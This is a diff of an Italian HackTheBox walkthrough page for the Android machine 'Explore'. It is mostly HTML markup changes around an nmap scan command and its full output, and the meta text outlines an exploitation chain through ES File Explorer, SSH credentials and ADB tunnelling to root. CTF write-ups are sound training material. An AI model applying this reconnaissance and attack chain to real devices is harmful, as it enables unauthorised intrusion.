@@ -6,8 +6,8 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Table of Contents:
- Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation   Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina." />
+<meta name="description" content=" Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina. Infine, l’aggressore è in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l’Android Debug Bridge (ADB). Questa eventualità consente all’utente malintenzionato di eseguire comandi come utente root.
+" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/" />
@@ -46,8 +46,8 @@
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Walkthrough Explore">
-<meta property="og:description" content="Table of Contents:
- Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation   Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina." />
+<meta property="og:description" content=" Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina. Infine, l’aggressore è in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l’Android Debug Bridge (ADB). Questa eventualità consente all’utente malintenzionato di eseguire comandi come utente root.
+" />
 <meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/" />
 <meta property="og:site_name" content="HomePage" />
 
@@ -60,6 +60,8 @@
 
   <meta property="article:section" content="Walkthrough HackTheBox" />
 
+
+  <meta property="article:published_time" content="0001-01-01 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -140,7 +142,7 @@
       <span class="post-author">Autore: k0Br@3390</span>
     
     
-      <span class="post-reading-time">:: 7 min read (1280 words)</span>
+      <span class="post-reading-time">:: 6 min read (1259 words)</span>
     
   </div>
 
@@ -165,20 +167,27 @@
 
 
   
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumerazione-con-nmap">Enumerazione con Nmap</a></li>
+    <li><a href="#analisi-delle-porte">Analisi delle porte</a>
+      <ul>
+        <li><a href="#sfruttamento-dellexploit-con-metasploit">Sfruttamento dell’Exploit con Metasploit</a></li>
+        <li><a href="#sfruttamento-dellexploit-con-cve-script-python">Sfruttamento dell’Exploit con CVE (Script Python)</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilage-escalation">Privilage Escalation</a></li>
+  </ul>
+</nav>
+    </div>
+  
 
   <div class="post-content"><div>
-        <p><strong>Table of Contents</strong>:</p>
-<ul>
-<li><a href="#enumerazione-con-nmap">Enumerazione con Nmap</a></li>
-<li><a href="#analisi-delle-porte">Analisi delle porte</a>
-<ul>
-<li><a href="#sfruttamento-dell-exploit-con-metasploit">Sfruttamento dell’Exploit con Metasploit</a></li>
-<li><a href="#sfruttamento-dell-exploit-con-cve--script-python-">Sfruttamento dell’Exploit con CVE (Script Python)</a></li>
-</ul>
-</li>
-<li><a href="#privilage-escalation">Privilage Escalation</a></li>
-</ul>
-<hr>
+        <hr>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/LogoExploreCTF.png"  class="left"  style="width: 300px"  />
 
@@ -188,126 +197,126 @@ Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del
 Infine, l’aggressore è in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l’Android Debug Bridge (ADB). Questa eventualità consente all’utente malintenzionato di eseguire comandi come utente root.</p>
 <h1 id="enumerazione-con-nmap">Enumerazione con Nmap<a href="#enumerazione-con-nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Eseguiamo l’enumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.10.247 | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
-2. nmap -p$ports -sC -sV <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
-</code></pre></div><p>L’output sarà:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-11-29 09:58 EST
-Nmap scan report <span style="color:#66d9ef">for</span> explore <span style="color:#f92672">(</span>10.10.10.247<span style="color:#f92672">)</span>
-Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
-
-PORT      STATE    SERVICE VERSION
-2222/tcp  open     ssh     <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-| fingerprint-strings: 
-|   NULL: 
-|_    SSH-2.0-SSH Server - Banana Studio
-| ssh-hostkey: 
-|_  <span style="color:#ae81ff">2048</span> 7190e3a7c95d836634883debb4c788fb <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-5555/tcp  filtered freeciv
-34245/tcp open     unknown
-| fingerprint-strings: 
-|   GenericLines: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:13 GMT
-|     Content-Length: <span style="color:#ae81ff">22</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Invalid request line:
-|   GetRequest: 
-|     HTTP/1.1 <span style="color:#ae81ff">412</span> Precondition Failed
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:13 GMT                                                                                                         
-|     Content-Length: <span style="color:#ae81ff">0</span>                                                                                                                           
-|   HTTPOptions:                                                                                                                                  
-|     HTTP/1.0 <span style="color:#ae81ff">501</span> Not Implemented                                                                                                                
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:18 GMT                                                                                                         
-|     Content-Length: <span style="color:#ae81ff">29</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Method not supported: OPTIONS
-|   Help: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
-|     Content-Length: <span style="color:#ae81ff">26</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Invalid request line: HELP
-|   RTSPRequest: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:18 GMT
-|     Content-Length: <span style="color:#ae81ff">39</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     valid protocol version: RTSP/1.0
-|   SSLSessionReq: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
-|     Content-Length: <span style="color:#ae81ff">73</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Invalid request line: 
-|     ?G???,???<span style="color:#e6db74">`</span>~?
-|     ??<span style="color:#f92672">{</span>????w????&lt;<span style="color:#f92672">=</span>?o?
-|   TLSSessionReq: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
-|     Content-Length: <span style="color:#ae81ff">71</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Invalid request line: 
-|     ??random1random2random3random4
-|   TerminalServerCookie: 
-|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
-|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
-|     Content-Length: <span style="color:#ae81ff">54</span>
-|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
-|     Connection: Close
-|     Invalid request line: 
-|_    Cookie: mstshash<span style="color:#f92672">=</span>nmap
-42135/tcp open     http    ES File Explorer Name Response httpd
-|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
-</span><span style="color:#e6db74">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
-</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain<span style="color:#f92672">)</span>.
-<span style="color:#ae81ff">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-<span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
-SF-Port2222-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/29%Time<span style="color:#f92672">=</span>63861E0F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>N
-SF:ULL,24,<span style="color:#e6db74">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span style="color:#f92672">)</span>;
-<span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
-SF-Port34245-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/29%Time<span style="color:#f92672">=</span>63861E0E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
-SF:GenericLines,AA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2
-</span><span style="color:#e6db74">SF:029\x20Nov\x202022\x2014:59:13\x20GMT\r\nContent-Length:\x2022\r\nConte
-</span><span style="color:#e6db74">SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
-</span><span style="color:#e6db74">SF:\r\nInvalid\x20request\x20line:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,5C,<span style="color:#e6db74">&#34;HTTP/1\.1\x20412
-</span><span style="color:#e6db74">SF:\x20Precondition\x20Failed\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:
-</span><span style="color:#e6db74">SF:59:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,B5,<span style="color:#e6db74">&#34;HTTP/1
-</span><span style="color:#e6db74">SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2029\x20Nov\x202022\
-</span><span style="color:#e6db74">SF:x2014:59:18\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
-</span><span style="color:#e6db74">SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
-</span><span style="color:#e6db74">SF:20supported:\x20OPTIONS&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,BB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20
-</span><span style="color:#e6db74">SF:Request\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:18\x20GMT\r\nCon
-</span><span style="color:#e6db74">SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
-</span><span style="color:#e6db74">SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
-</span><span style="color:#e6db74">SF::\x20\x20RTSP/1\.0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,AE,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
-</span><span style="color:#e6db74">SF:ate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:
-</span><span style="color:#e6db74">SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
-</span><span style="color:#e6db74">SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionRe
-SF:q,DD,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2029\x20Nov\
-</span><span style="color:#e6db74">SF:x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
-</span><span style="color:#e6db74">SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
-</span><span style="color:#e6db74">SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
-</span><span style="color:#e6db74">SF:?\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalS
-SF:erverCookie,CA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
-</span><span style="color:#e6db74">SF:29\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2054\r\nConten
-</span><span style="color:#e6db74">SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
-</span><span style="color:#e6db74">SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
-</span><span style="color:#e6db74">SF:shash=nmap&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,DB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\n
-</span><span style="color:#e6db74">SF:Date:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length
-</span><span style="color:#e6db74">SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
-</span><span style="color:#e6db74">SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
-</span><span style="color:#e6db74">SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&#34;</span><span style="color:#f92672">)</span>;
-Service Info: Device: phone
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 101.61 seconds
-</code></pre></div><h1 id="analisi-delle-porte">Analisi delle porte<a href="#analisi-delle-porte" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.10.247 | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>2. nmap -p$ports -sC -sV <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>L’output sarà:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-11-29 09:58 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> explore <span style="color:#f92672">(</span>10.10.10.247<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span>2222/tcp  open     ssh     <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   NULL: 
+</span></span><span style="display:flex;"><span>|_    SSH-2.0-SSH Server - Banana Studio
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">2048</span> 7190e3a7c95d836634883debb4c788fb <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5555/tcp  filtered freeciv
+</span></span><span style="display:flex;"><span>34245/tcp open     unknown
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:13 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line:
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">412</span> Precondition Failed
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:13 GMT                                                                                                         
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>                                                                                                                           
+</span></span><span style="display:flex;"><span>|   HTTPOptions:                                                                                                                                  
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">501</span> Not Implemented                                                                                                                
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:18 GMT                                                                                                         
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Method not supported: OPTIONS
+</span></span><span style="display:flex;"><span>|   Help: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line: HELP
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:18 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">39</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     valid protocol version: RTSP/1.0
+</span></span><span style="display:flex;"><span>|   SSLSessionReq: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">73</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line: 
+</span></span><span style="display:flex;"><span>|     ?G???,???<span style="color:#e6db74">`</span>~?
+</span></span><span style="display:flex;"><span>|     ??<span style="color:#f92672">{</span>????w????&lt;<span style="color:#f92672">=</span>?o?
+</span></span><span style="display:flex;"><span>|   TLSSessionReq: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">71</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line: 
+</span></span><span style="display:flex;"><span>|     ??random1random2random3random4
+</span></span><span style="display:flex;"><span>|   TerminalServerCookie: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">29</span> Nov <span style="color:#ae81ff">2022</span> 14:59:34 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line: 
+</span></span><span style="display:flex;"><span>|_    Cookie: mstshash<span style="color:#f92672">=</span>nmap
+</span></span><span style="display:flex;"><span>42135/tcp open     http    ES File Explorer Name Response httpd
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port2222-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/29%Time<span style="color:#f92672">=</span>63861E0F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>N
+</span></span><span style="display:flex;"><span>SF:ULL,24,<span style="color:#e6db74">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port34245-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/29%Time<span style="color:#f92672">=</span>63861E0E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:GenericLines,AA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:029\x20Nov\x202022\x2014:59:13\x20GMT\r\nContent-Length:\x2022\r\nConte
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\nInvalid\x20request\x20line:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,5C,<span style="color:#e6db74">&#34;HTTP/1\.1\x20412
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20Precondition\x20Failed\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:59:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,B5,<span style="color:#e6db74">&#34;HTTP/1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2029\x20Nov\x202022\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x2014:59:18\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20supported:\x20OPTIONS&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,BB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Request\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:18\x20GMT\r\nCon
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\x20RTSP/1\.0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,AE,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionRe
